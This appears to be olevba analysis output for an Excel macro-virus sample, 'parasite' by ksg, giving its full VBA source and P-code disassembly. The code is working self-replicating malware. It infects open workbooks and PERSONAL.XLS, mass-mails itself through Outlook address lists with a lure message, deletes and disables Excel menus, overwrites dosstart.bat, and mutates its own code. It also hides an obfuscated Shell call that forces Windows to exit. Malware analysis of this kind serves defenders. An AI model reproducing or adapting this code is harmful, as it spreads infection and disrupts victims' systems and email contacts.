olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Ksg.b.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Ksg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSExcel.Ksg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSExcel.Ksg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSExcel.Ksg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Ksg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ----------------------------------------------------------------------------------------
' This is parasite excel macro
' (c) 1999 by ksg
' astigmatiZm virus group
' www.astigmatiZm.cjb.net
' rename this file to parasite.bas and import it in MS Excel Visual Basic Editor to activate
' ----------------------------------------------------------------------------------------

Sub AutoOpen()
Application.OnSheetActivate = "parasite"
Call Mail
End Sub

Sub parasite()
On Error Resume Next

vname = "parasite"
dwb = "PERSONAL.XLS"
dvp = Application.StartupPath & "\" & dwb
counter1 = 0
counter2 = 0

With Application
.ScreenUpdating = False
.DisplayAlerts = False
.EnableCancelKey = xlDisabled
End With

Set cb = CommandBars: Set crtl = Controls

cb("Tools").ctrl(10).Delete: cb("Tools").ctrl(12).Delete
cb("View").ctrl(3).Delete: cb("Window").ctrl(3).Delete
cb("Window").ctrl(4).Delete

Call Poly

Randomize

If Int((Rnd * 10) + 1) = 10 Then
        Application.Caption = "Microsoft Parasite 2000"
        Application.StatusBar = "You have unleashed the parasite"
        Open "c:\windows\dosstart.bat" For Output Access Write As 1
        Print #1, "@ECHO OFF"
        Print #1, "ECHO ---------------------------------"
        Print #1, "ECHO  You have unleashed the parasite "
        Print #1, "ECHO ---------------------------------"
        Print #1, "ECHO   (c) 2000 k s g  [astigmatiZm]  "
        Print #1, "ECHO ---------------------------------"
        Close 1
End If

If Month(Now) = 9 And Day(Now) = 10 Then Call hidetb
If Month(Now) = 9 And Day(Now) = 11 Then Call showtb

Application.VBE.ActiveVBProject.VBComponents.Item(vname).Export "C:\progra~1\parasite.sys"

If Dir(dvp) = dwb Then counter2 = 1

        For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
                If ActiveWorkbook.VBProject.VBComponents(x).Name = vname Then counter1 = 1
        Next x

If counter1 = 0 Then
        ActiveWorkbook.VBProject.VBComponents.Import "C:\progra~1\parasite.sys"
        ActiveWorkbook.Save
End If

If counter2 = 0 Then
        Workbooks.Add.SaveAs FileName:=dvp
        ActiveWorkbook.VBProject.VBComponents.Import "C:\progra~1\parasite.sys"
        ActiveWindow.Visible = False
        Workbooks(dwb).Save
End If

End Sub

Sub hidetb()
On Error Resume Next
CommandBars("Edit").Enabled = False:    CommandBars("Insert").Enabled = False
CommandBars("File").Enabled = False:    CommandBars("Tools").Enabled = False
End Sub

Sub showtb()
On Error Resume Next
CommandBars("Edit").Enabled = True:     CommandBars("Insert").Enabled = True
CommandBars("File").Enabled = True:     CommandBars("Tools").Enabled = True
End Sub

Sub ViewVBCode()
MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(118) + Chr(101) + Chr(114) + Chr(115) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(111) + Chr(102) + Chr(32) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) & vbCr & Chr(112) + Chr(114) + Chr(111) + Chr(104) + Chr(105) + Chr(98) + Chr(105) + Chr(116) + Chr(115) + Chr(32) + Chr(115) + Chr(117) + Chr(99) + Chr(104) + Chr(32) + Chr(99) + Chr(111) + Chr(109) + Chr(109) + Chr(97) + Chr(110) + Chr(100) + Chr(115) + Chr(44) + Chr(32) + Chr(112) + Chr(108) + Chr(101) + Chr(97) + Chr(115) + Chr(101) + Chr(34) & vcCr & Chr(114) + Chr(101) + Chr(102) + Chr(101) + Chr(114) + Chr(32) + Chr(116) + Chr(111) + Chr(32) + Chr(117) + Chr(115) + Chr(101) + Chr(114) + Chr(115) + Chr(32) + Chr(109) + Chr(97) + Chr(110) + Chr(117) + Chr(97) + Chr(108) + Chr(32) + Chr(40) + Chr(115) + Chr(101) + Chr(99) + Chr(46) + Chr(32) + Chr(50) + Chr(41) + Chr(32) _
, vbCritical, "Microsoft Excel Warning"
ActiveWorkbook.Save
Shell Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(68) + Chr(79) + Chr(87) + Chr(83) + Chr(92) + Chr(82) + Chr(85) + Chr(78) + Chr(68) + Chr(76) + Chr(76) + Chr(46) + Chr(69) + Chr(88) + Chr(69) + Chr(32) + Chr(117) + Chr(115) + Chr(101) + Chr(114) + Chr(46) + Chr(101) + Chr(120) + Chr(101) + Chr(44) + Chr(101) + Chr(120) + Chr(105) + Chr(116) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115), vbHide
End Sub

Sub Mail()
On Error Resume Next

Randomize

'lots o variables ---------------------------
Set outapp = CreateObject("Outlook.Application"): Set mapname = outapp.GetNameSpace("MAPI")
Set al = AddressLists: Set cnt = Count: Set lo = Logoff: Set aeck = Application: Set adacwb = Attachments
Set sj = Subject: Set bdy = Body: Set Snd = send: Set awb = ActiveWorkbook: Set fn = FullName
Set lgon = Logon: Set citm = CreateItem: Set usnm = UserName: oln4 = "Outlook"
'--------------------------------------------

aeck.EnableCancelKey = 0

If outapp = oln4 Then mapname.lgon "profile", "password"

For y = 1 To mapname.al.cnt
        mailoop = 1

        Set addlist = mapname.al(y): Set psite = outapp.citm(0)

                For z = 1 To addlist.al.cnt
        
                        
one:
                        vi = addlist.AddressEntries(mailoop)
                        GoTo two
three:
                        mailoop = mailoop + 1
                        If mailoop > 40 Then z = addlist.al.cnt
                        GoTo four
two:
                        psite.Recipients.Add vi
                        GoTo three
four:
                Next z

        psite.sj = "Lets make this work!"
        psite.bdy = "Are you sick and tired of Microsoft products bugs? Lets unite and protest. Fill up the attached form and send to ms-trial@doj.gov" + Chr$(13) + aeck.usnm
        psite.adacwb.Add awb.fn
        psite.Snd

        vi = ""
Next y

mapname.lo

End Sub

Sub Poly()
'poly from jackie /MVT . tnx man!
On Error Resume Next
Set Current = MacroContainer

For ploop = 1 To 20
        Number = Current.VBProject.VBComponents("parasite").CodeModule.ProcCountLines("parasite", vbext_pk_Proc)
        RandomLine = Int(Rnd() * Number + 1)
        rl = Int(Rnd() * 40 + 1)
        
        For cl = 1 To rl
                rb = rb + Chr$(Int((90 - 65 + 1) * Rnd + 65))
        Next cl

        Current.VBProject.VBComponents("parasite").CodeModule.InsertLines RandomLine, vbTab & "' " & rb
        rb = ""
Next ploop

End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Ksg.b.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1184 bytes
' _VBA_PROJECT_CUR/VBA/Foglio1 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio2 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio3 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Module1 - 17721 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0059 " ----------------------------------------------------------------------------------------"
' Line #1:
' 	QuoteRem 0x0000 0x001D " This is parasite excel macro"
' Line #2:
' 	QuoteRem 0x0000 0x0010 " (c) 1999 by ksg"
' Line #3:
' 	QuoteRem 0x0000 0x0018 " astigmatiZm virus group"
' Line #4:
' 	QuoteRem 0x0000 0x0018 " www.astigmatiZm.cjb.net"
' Line #5:
' 	QuoteRem 0x0000 0x005B " rename this file to parasite.bas and import it in MS Excel Visual Basic Editor to activate"
' Line #6:
' 	QuoteRem 0x0000 0x0059 " ----------------------------------------------------------------------------------------"
' Line #7:
' Line #8:
' 	FuncDefn (Sub AutoOpen())
' Line #9:
' 	LitStr 0x0008 "parasite"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #10:
' 	ArgsCall (Call) Mail 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' 	FuncDefn (Sub parasite())
' Line #14:
' 	OnError (Resume Next) 
' Line #15:
' Line #16:
' 	LitStr 0x0008 "parasite"
' 	St vname 
' Line #17:
' 	LitStr 0x000C "PERSONAL.XLS"
' 	St dwb 
' Line #18:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld dwb 
' 	Concat 
' 	St dvp 
' Line #19:
' 	LitDI2 0x0000 
' 	St counter1 
' Line #20:
' 	LitDI2 0x0000 
' 	St counter2 
' Line #21:
' Line #22:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #23:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #24:
' 	LitVarSpecial (False)
' 	MemStWith DisplayAlerts 
' Line #25:
' 	Ld xlDisabled 
' 	MemStWith EnableCancelKey 
' Line #26:
' 	EndWith 
' Line #27:
' Line #28:
' 	SetStmt 
' 	Ld CommandBars 
' 	Set cb 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Controls 
' 	Set crtl 
' Line #29:
' Line #30:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #31:
' 	LitDI2 0x0003 
' 	LitStr 0x0004 "View"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	LitStr 0x0006 "Window"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #32:
' 	LitDI2 0x0004 
' 	LitStr 0x0006 "Window"
' 	ArgsLd cb 0x0001 
' 	ArgsMemLd ctrl 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #33:
' Line #34:
' 	ArgsCall (Call) Poly 0x0000 
' Line #35:
' Line #36:
' 	ArgsCall Read 0x0000 
' Line #37:
' Line #38:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x0017 "Microsoft Parasite 2000"
' 	Ld Application 
' 	MemSt Caption 
' Line #40:
' 	LitStr 0x001F "You have unleashed the parasite"
' 	Ld Application 
' 	MemSt StatusBar 
' Line #41:
' 	LitStr 0x0017 "c:\windows\dosstart.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ECHO ---------------------------------"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ECHO  You have unleashed the parasite "
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ECHO ---------------------------------"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ECHO   (c) 2000 k s g  [astigmatiZm]  "
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "ECHO ---------------------------------"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #49:
' 	EndIfBlock 
' Line #50:
' Line #51:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) hidetb 0x0000 
' 	EndIf 
' Line #52:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) showtb 0x0000 
' 	EndIf 
' Line #53:
' Line #54:
' 	LitStr 0x0018 "C:\progra~1\parasite.sys"
' 	Ld vname 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #55:
' Line #56:
' 	Ld dvp 
' 	ArgsLd Dir 0x0001 
' 	Ld dwb 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St counter2 
' 	EndIf 
' Line #57:
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #59:
' 	Ld x 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld vname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St counter1 
' 	EndIf 
' Line #60:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' Line #62:
' 	Ld counter1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #63:
' 	LitStr 0x0018 "C:\progra~1\parasite.sys"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #64:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	EndIfBlock 
' Line #66:
' Line #67:
' 	Ld counter2 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld dvp 
' 	ParamNamed FileName 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0001 
' Line #69:
' 	LitStr 0x0018 "C:\progra~1\parasite.sys"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #71:
' 	Ld dwb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	EndIfBlock 
' Line #73:
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Sub hidetb())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0028 
' 	LitVarSpecial (False)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #79:
' 	LitVarSpecial (False)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0028 
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Sub showtb())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0028 
' 	LitVarSpecial (True)
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #85:
' 	LitVarSpecial (True)
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0028 
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' 	FuncDefn (Sub ViewVBCode())
' Line #89:
' 	LineCont 0x0004 DA 01 00 00
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vcCr 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0017 "Microsoft Excel Warning"
' 	ArgsCall MsgBox 0x0003 
' Line #90:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #91:
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
